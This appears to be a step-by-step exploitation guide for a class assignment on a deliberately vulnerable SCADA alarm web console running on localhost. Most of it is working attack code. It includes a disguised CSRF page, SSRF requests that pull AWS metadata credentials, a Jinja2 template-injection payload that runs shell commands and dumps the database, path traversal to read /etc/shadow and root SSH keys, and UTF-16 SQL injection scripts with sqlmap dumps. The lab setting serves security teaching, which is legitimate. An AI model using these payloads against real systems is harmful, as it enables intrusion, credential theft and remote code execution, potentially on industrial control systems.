# Exploitation Guide - SCADA Alarm Management Console Task 9

This guide provides step-by-step instructions for exploiting each vulnerability.

## Prerequisites

- Burp Suite Professional or Community Edition
- Python 3.8+
- curl
- SQLMap
- OWASP ZAP (optional)

## Vulnerability 1: CSRF Attack

### Manual Exploitation

**Step 1: Create malicious HTML page**

```html
<!-- save as csrf_attack.html -->
<!DOCTYPE html>
<html>
<head><title>SCADA Update</title></head>
<body>
    <h1>Installing System Update...</h1>
    <form id="attack" method="POST" action="http://localhost:5000/acknowledge/1">
    </form>
    <script>document.getElementById('attack').submit();</script>
</body>
</html>
```

**Step 2: Host and deliver**

```bash
# Host the file
python3 -m http.server 8080

# Send link to authenticated user
# When they visit http://your-ip:8080/csrf_attack.html
# Alarm #1 will be automatically acknowledged
```

### Using Burp Suite

1. Intercept legitimate acknowledge request
2. Right-click → Engagement Tools → Generate CSRF PoC
3. Test in browser
4. **Vulnerable:** Auto-submits successfully
5. **Patched:** Fails with 403 error

### Verification

```bash
# Check alarm status before
curl http://localhost:5000/alarm/1 -H "Cookie: session=SESSION"

# After CSRF attack
curl http://localhost:5000/alarm/1 -H "Cookie: session=SESSION"
# acknowledged field changes from 0 to 1
```

---

## Vulnerability 2: SSRF + Template RCE

### Attack 2.1: Internal Network Scan

```bash
# Scan internal services
for port in 22 80 3306 5432 6379 8080; do
    echo "Testing localhost:$port"
    curl -X POST http://localhost:5000/reports \
      -H "Cookie: session=SESSION" \
      -d "report_type=summary" \
      -d "data_source=http://localhost:$port" \
      -d "template_url=http://example.com/t.html" \
      -w "\nTime: %{time_total}s\n"
done
```

### Attack 2.2: AWS Metadata Theft

```bash
# Steal AWS credentials
curl -X POST http://localhost:5000/reports \
  -H "Cookie: session=SESSION" \
  -d "data_source=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -d "template_url=http://example.com/template.html" \
  --output aws_creds.html

# Check for credentials in response
grep -A 5 "external_data" aws_creds.html
```

### Attack 2.3: Remote Code Execution

**Step 1: Create malicious template**

```jinja2
<!-- save as rce.html and host on your server -->
<html>
<body>
    <h1>System Information</h1>
    
    <!-- whoami -->
    <h2>User:</h2>
    <pre>{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read() }}</pre>
    
    <!-- list files -->
    <h2>Files:</h2>
    <pre>{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('ls -la').read() }}</pre>
    
    <!-- read database -->
    <h2>Database:</h2>
    <pre>{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat scada_alarms.db | base64').read() }}</pre>
</body>
</html>
```

**Step 2: Host template**

```bash
python3 -m http.server 8000
# Template available at http://your-ip:8000/rce.html
```

**Step 3: Trigger RCE**

```bash
curl -X POST http://localhost:5000/reports \
  -H "Cookie: session=SESSION" \
  -d "report_type=summary" \
  -d "template_url=http://your-ip:8000/rce.html" \
  --output rce_result.html

# View results
firefox rce_result.html
```

### Using Burp Suite

1. Intercept POST to /reports
2. Modify template_url parameter
3. Try various SSRF payloads:
   - `http://localhost:8080/admin`
   - `http://169.254.169.254/latest/meta-data/`
   - `http://10.0.0.1/`
4. **Vulnerable:** Fetches internal resources
5. **Patched:** Blocks with allowlist error

---

## Vulnerability 3: Path Traversal

### Attack 3.1: Read /etc/passwd

```bash
curl -X POST http://localhost:5000/export_logs \
  -H "Cookie: session=SESSION" \
  -d "log_file=../../../../../../etc/passwd" \
  --output passwd.txt

cat passwd.txt
```

### Attack 3.2: Steal Database

```bash
curl -X POST http://localhost:5000/export_logs \
  -H "Cookie: session=SESSION" \
  -d "log_file=../scada_alarms.db" \
  --output stolen.db

# Analyze database
sqlite3 stolen.db
sqlite> SELECT * FROM users;
sqlite> SELECT * FROM alarms WHERE severity='critical';
```

### Attack 3.3: Read Application Source

```bash
curl -X POST http://localhost:5000/export_logs \
  -H "Cookie: session=SESSION" \
  -d "log_file=../app.py" \
  --output app_source.py

# Find more vulnerabilities
grep -n "cursor.execute" app_source.py
```

### Attack 3.4: Read SSH Keys

```bash
curl -X POST http://localhost:5000/export_logs \
  -H "Cookie: session=SESSION" \
  -d "log_file=../../../../../../root/.ssh/id_rsa" \
  --output id_rsa

chmod 600 id_rsa
ssh -i id_rsa root@target
```

### Using Burp Intruder

1. Intercept POST to /export_logs
2. Send to Intruder
3. Mark log_file parameter
4. Load payload list:
   ```
   ../etc/passwd
   ../../etc/passwd
   ../../../etc/passwd
   ../app.py
   ../scada_alarms.db
   /etc/shadow
   /proc/self/environ
   ```
5. Start attack
6. **Vulnerable:** Many payloads return 200 OK
7. **Patched:** All return 400 Bad Request

---

## Vulnerability 4: Encoding-Based SQL Injection

### Attack 4.1: Authentication Bypass

**Python Script:**

```python
#!/usr/bin/env python3
# save as sqli_utf16.py

import requests

# SQL injection payload
payload = "admin' OR '1'='1'--"

# Encode in UTF-16LE
encoded = payload.encode('utf-16le')

response = requests.post(
    'http://localhost:5000/login',
    headers={'Content-Encoding': 'utf-16le'},
    data={
        'username': encoded,
        'password': 'anything'
    },
    allow_redirects=False
)

print(f"Status: {response.status_code}")
if response.status_code == 302:
    print("[+] Authentication bypassed!")
    print(f"Session: {response.cookies.get('session')}")
else:
    print("[-] Failed")
```

**Run:**

```bash
python3 sqli_utf16.py
```

### Attack 4.2: Data Exfiltration

**Python Script:**

```python
#!/usr/bin/env python3
# save as sqli_exfil.py

import requests

session = 'YOUR_SESSION_COOKIE'

# Extract database schema
payload = "' UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13 FROM sqlite_master--"
encoded = payload.encode('utf-16le')

response = requests.get(
    'http://localhost:5000/api/search_alarms',
    headers={'Content-Encoding': 'utf-16le'},
    params={'q': encoded},
    cookies={'session': session}
)

print(response.json())
```

### Using SQLMap

**Basic Test:**

```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  --level=5 \
  --risk=3 \
  --batch
```

**Enumerate Databases:**

```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  --dbs
```

**Dump Tables:**

```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  -D scada_alarms \
  --tables

sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  -D scada_alarms \
  -T users \
  --dump
```

**With Custom Tamper Script:**

```python
# save as utf16_tamper.py
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    if payload:
        return payload.encode('utf-16le')
    return payload
```

```bash
sqlmap -u "http://localhost:5000/login" \
  --data="username=admin&password=test" \
  --tamper=utf16_tamper \
  --dbs
```

---

## Comprehensive Testing Script

```bash
#!/bin/bash
# save as test_all_vulns.sh

echo "=== Testing All Vulnerabilities ==="

SESSION="YOUR_SESSION_COOKIE"
TARGET="http://localhost:5000"

echo -e "\n[1] Testing CSRF..."
curl -X POST "$TARGET/acknowledge/1" \
  -H "Cookie: session=$SESSION" \
  -w "\nStatus: %{http_code}\n"

echo -e "\n[2] Testing SSRF..."
curl -X POST "$TARGET/reports" \
  -H "Cookie: session=$SESSION" \
  -d "data_source=http://localhost:8080" \
  -d "template_url=http://example.com/t.html" \
  -w "\nStatus: %{http_code}\n"

echo -e "\n[3] Testing Path Traversal..."
curl -X POST "$TARGET/export_logs" \
  -H "Cookie: session=$SESSION" \
  -d "log_file=../../../etc/passwd" \
  -w "\nStatus: %{http_code}\n"

echo -e "\n[4] Testing SQL Injection..."
curl -X POST "$TARGET/login" \
  -d "username=admin' OR '1'='1'--&password=test" \
  -w "\nStatus: %{http_code}\n"

echo -e "\n=== Testing Complete ==="
```

---

## Burp Suite Professional Features

### Active Scanner

1. Configure target scope: http://localhost:5000
2. Spider the application
3. Run active scan
4. Review findings:
   - **Vulnerable:** SQL injection, Path traversal, CSRF, SSRF
   - **Patched:** No high-severity findings

### Collaborator

Test SSRF with Burp Collaborator:

1. Get Collaborator URL: `abc123.burpcollaborator.net`
2. Use as data_source in reports
3. Check for pingbacks
4. **Vulnerable:** Receives HTTP request
5. **Patched:** No pingback (blocked)

---

## OWASP ZAP

### Automated Scan

```bash
# Start ZAP
zap.sh -daemon -port 8090

# Spider
curl "http://localhost:8090/JSON/spider/action/scan/?url=http://localhost:5000"

# Active Scan
curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://localhost:5000"

# Get report
curl "http://localhost:8090/OTHER/core/other/htmlreport/" > zap_report.html
```

---

## Documentation for Report

For each vulnerability, document:

1. **Vulnerability Description**
   - Type (CSRF, SSRF, etc.)
   - Location (endpoint/line number)
   - Impact (confidentiality/integrity/availability)

2. **Exploitation Steps**
   - Tools used
   - Commands executed
   - Screenshots

3. **Proof of Concept**
   - Working exploit code
   - Test results

4. **Patch Implementation**
   - Code changes
   - Security improvements
   - Testing results

5. **Re-testing**
   - Verify patch effectiveness
   - Tool output showing fix

---

## Tips for Video Demonstration

1. **Introduction (1 min)**
   - Show dashboard
   - Explain SCADA scenario
   - Overview of vulnerabilities

2. **Vulnerability 1 - CSRF (3 min)**
   - Show vulnerable code
   - Create malicious page
   - Demonstrate attack
   - Show patched version
   - Re-test with CSRF token

3. **Vulnerability 2 - SSRF/RCE (4 min)**
   - Show vulnerable endpoint
   - Scan internal network
   - Execute remote code
   - Show patched validation
   - Re-test blocked requests

4. **Vulnerability 3 - Path Traversal (3 min)**
   - Show vulnerable file handling
   - Read /etc/passwd
   - Steal database
   - Show sanitization patch
   - Re-test blocked traversal

5. **Vulnerability 4 - SQL Injection (4 min)**
   - Show vulnerable query
   - Bypass authentication
   - Extract data
   - Show parameterized queries
   - Re-test safe queries

6. **Monitoring System (2 min)**
   - Show real-time detection
   - Attack classification
   - Statistics

7. **Conclusion (1 min)**
   - Summary of findings
   - Lessons learned
   - Best practices

Total: 18 minutes

---

## Checklist for Submission

- [ ] Vulnerable source code
- [ ] Patched source code
- [ ] requirements.txt for both versions
- [ ] Dockerfile for both versions
- [ ] Docker compose file
- [ ] Database population script
- [ ] Populated database file
- [ ] Comprehensive report (PDF)
- [ ] Video demonstration (MP4)
- [ ] Exploitation scripts
- [ ] Tool outputs/screenshots
- [ ] Monitoring system code
- [ ] README.md

---

## Common Issues

**Issue:** SQLMap doesn't find injection  
**Solution:** Use --level=5 --risk=3 or custom tamper script

**Issue:** Path traversal blocked by OS  
**Solution:** Test on Linux container, not Windows

**Issue:** CSRF token in patched version  
**Solution:** Templates must include {{ csrf_token() }}

**Issue:** Docker build fails  
**Solution:** Check Python version (need 3.11+)

---

Good luck with your assignment!
